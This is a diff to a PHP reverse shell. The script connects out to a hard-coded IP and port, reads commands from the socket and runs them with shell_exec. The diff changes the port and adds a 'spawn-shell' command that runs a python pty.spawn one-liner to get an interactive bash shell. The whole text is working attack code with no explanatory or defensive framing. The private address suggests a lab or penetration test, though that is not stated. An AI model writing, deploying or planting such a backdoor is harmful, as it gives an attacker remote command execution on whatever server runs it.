@@ -1,6 +1,6 @@
 <?php
 $host = '192.168.92.203';
-$port = 10158;
+$port = 10159;
 
 $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
 socket_connect($socket, $host, $port);
@@ -20,6 +20,8 @@ while (true) {
             chdir(getcwd() . '/' . $new_directory);
         }
         $output = 'Changed directory';
+    } elseif (trim($command) == 'spawn-shell') {
+        $output = exec('python3 -c \'import pty;pty.spawn("/bin/bash")\'');
     } else {
         $output = shell_exec($command);
     }
